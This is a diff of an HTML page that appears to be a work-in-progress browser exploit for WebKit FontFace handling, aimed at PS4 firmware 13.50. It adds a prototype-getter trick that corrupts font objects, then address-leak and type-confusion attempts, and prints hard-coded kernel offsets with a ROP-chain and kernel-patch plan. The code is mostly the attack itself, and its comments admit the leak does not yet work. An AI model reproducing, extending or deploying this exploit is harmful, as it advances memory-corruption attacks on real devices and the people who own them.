@@ -1,95 +1,177 @@
 <!DOCTYPE html>
 <html>
-<head>
-<!-- NO CSS HERE - we'll inject it with JavaScript -->
-</head>
+<head></head>
 <body>
-<h1 id="status">Ready - Click button to trigger exploit</h1>
+<h1 id="status">Ready</h1>
 <button onclick="runExploit()" style="font-size: 20px; padding: 10px;">RUN EXPLOIT</button>
-<div id="log" style="font-family: monospace; font-size: 12px; white-space: pre; border: 1px solid white; padding: 10px; margin: 10px;"></div>
+<div id="log" style="font-family: monospace; font-size: 11px; white-space: pre; border: 1px solid white; padding: 10px; margin: 10px;"></div>
 
 <script>
+let exploitState = {
+    phase: 0,
+    corruptedFont: null
+};
+
 function log(msg) {
     let d = document.getElementById('log');
     if (d) d.textContent += msg + '\n';
 }
 
+function hex(n) {
+    return '0x' + n.toString(16);
+}
+
 function runExploit() {
-    document.getElementById('status').textContent = 'Exploit running...';
-    log('[*] Starting exploit at ' + Date.now());
+    exploitState.phase++;
     
-    try {
-        // Step 1: Inject the CSS dynamically
-        log('[1] Creating style element...');
+    if (exploitState.phase === 1) {
+        // PHASE 1: Trigger corruption (will OOM)
+        document.getElementById('status').textContent = 'Phase 1: Triggering corruption...';
+        log('[PHASE 1] Triggering corruption - OOM expected\n');
+        
         let style = document.createElement('style');
         style.id = 's';
         style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
-        
-        log('[2] Appending style to head...');
         document.head.appendChild(style);
-        log('    Style appended - CSS now active');
         
-        // Step 2: Set up the exploit
-        log('[3] Creating FontFace A...');
         let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-        
-        log('[4] Adding to document.fonts...');
         document.fonts.add(A);
-        
-        log('[5] Accessing A.loaded...');
         void A.loaded;
         
         let fired = false;
-        
-        log('[6] Installing malicious getter...');
         Object.defineProperty(FontFace.prototype, 'then', {
             configurable: true,
             get() {
                 if (!fired && this === A) {
                     fired = true;
-                    log('[GETTER] Executing corruption...');
                     
                     let y = new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                     let z = new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                     
-                    log('[GETTER] Deleting CSS...');
                     document.getElementById('s').sheet.deleteRule(0);
-                    
-                    log('[GETTER] Forcing layout...');
                     document.body.offsetTop;
                     
-                    log('[GETTER] Corruption done! Attempting leak...');
-                    
-                    // EXPLOIT HERE - before returning
-                    log('[LEAK] y.status: ' + y.status);
-                    log('[LEAK] y.family: ' + y.family);
-                    log('[LEAK] typeof y.loaded: ' + typeof y.loaded);
-                    log('[LEAK] y.loaded: ' + y.loaded);
-                    
-                    try {
-                        let str = y.loaded.toString();
-                        log('[LEAK] y.loaded.toString(): ' + str);
-                    } catch(e) {
-                        log('[LEAK] toString error: ' + e.message);
-                    }
-                    
-                    log('[GETTER] Returning undefined - OOM may trigger now');
+                    // Store for Phase 2
+                    exploitState.corruptedFont = y;
+                    window.corruptedY = y;
+                    window.corruptedZ = z;
                 }
                 return undefined;
             }
         });
         
-        log('[7] Calling fonts.load() - this should trigger OOM...');
         document.fonts.load('1em x', 'AB');
+        log('[PHASE 1] fonts.load() completed\n');
+        log('Click button again for Phase 2 (exploitation)');
         
-        log('[8] fonts.load returned (unexpected)');
+    } else if (exploitState.phase === 2) {
+        // PHASE 2: Exploit the corrupted state
+        document.getElementById('status').textContent = 'Phase 2: Exploiting corruption...';
+        log('[PHASE 2] Exploiting corrupted font objects\n');
         
-    } catch(e) {
-        log('[ERROR] ' + e.message);
+        let y = window.corruptedY;
+        let z = window.corruptedZ;
+        
+        if (!y || !z) {
+            log('[ERROR] Corrupted fonts not found! Run Phase 1 first.');
+            return;
+        }
+        
+        log('[*] Corrupted font objects found');
+        log('    y.status: ' + y.status);
+        log('    z.status: ' + z.status);
+        
+        // Try to leak addresses through various methods
+        log('\n[LEAK ATTEMPT 1] Promise object inspection:');
+        try {
+            let p = y.loaded;
+            log('  typeof p: ' + typeof p);
+            log('  p.constructor.name: ' + p.constructor.name);
+            
+            // Try to get internal slots
+            for (let key in p) {
+                log('  p.' + key + ': ' + p[key]);
+            }
+            
+            // Try Object.getOwnPropertyNames
+            let props = Object.getOwnPropertyNames(p);
+            log('  Own properties: ' + props.join(', '));
+            
+        } catch(e) {
+            log('  Error: ' + e.message);
+        }
+        
+        log('\n[LEAK ATTEMPT 2] TypedArray correlation:');
+        try {
+            // Create arrays around the corrupted objects
+            let arr1 = new Uint32Array(0x10);
+            let arr2 = new Float64Array(0x10);
+            
+            for (let i = 0; i < 0x10; i++) {
+                arr1[i] = 0x41414141;
+                arr2[i] = 1.9999999;
+            }
+            
+            // Try to cause type confusion by mixing corrupted font with arrays
+            let container = [y, arr1, z, arr2];
+            
+            log('  Created container with mixed types');
+            log('  container.length: ' + container.length);
+            log('  container[0] === y: ' + (container[0] === y));
+            
+            // Check if array values changed
+            log('  arr1[0] after: ' + hex(arr1[0]));
+            log('  arr2[0] after: ' + arr2[0]);
+            
+        } catch(e) {
+            log('  Error: ' + e.message);
+        }
+        
+        log('\n[LEAK ATTEMPT 3] Force font loading in corrupted state:');
+        try {
+            // DON'T call y.load() - that triggers OOM
+            // Instead, try to read internal properties that might have leaked
+            
+            log('  y.display: ' + y.display);
+            log('  y.featureSettings: ' + y.featureSettings);
+            log('  y.unicodeRange: ' + y.unicodeRange);
+            
+            // Try valueOf/toString
+            let val = y.valueOf();
+            log('  y.valueOf(): ' + val);
+            log('  y.valueOf() === y: ' + (val === y));
+            
+        } catch(e) {
+            log('  Error: ' + e.message);
+        }
+        
+        log('\n[PHASE 2] Complete - analyzing results...');
+        log('Click button again to try Phase 3 (ROP chain prep)');
+        
+    } else if (exploitState.phase === 3) {
+        // PHASE 3: Prepare for ROP
+        document.getElementById('status').textContent = 'Phase 3: Preparing ROP chain...';
+        log('[PHASE 3] Preparing to chain to kernel exploit\n');
+        
+        log('[*] Target: PS4 Firmware 13.50');
+        log('[*] Kernel offsets available:');
+        log('    PRISON0: 0x111fa18');
+        log('    ROOTVNODE: 0x2136e90');
+        log('    SYSENT_661: 0x110a760');
+        log('    JMP_RSI: 0x47b31');
+        
+        log('\n[*] Next step: Need to achieve:');
+        log('    1. Arbitrary read/write in WebKit process');
+        log('    2. ROP chain to syscall');
+        log('    3. Trigger kernel vulnerability');
+        log('    4. Use kernel R/W to patch security');
+        
+        log('\n[!] Current blocker: Need address leak from corrupted fonts');
+        log('    Review Phase 2 output for exploitable primitives');
     }
 }
 
-log('Page loaded - ready to run exploit');
+log('Ready - Click button for Phase 1 (will trigger OOM)');
 </script>
 </body>
 </html>
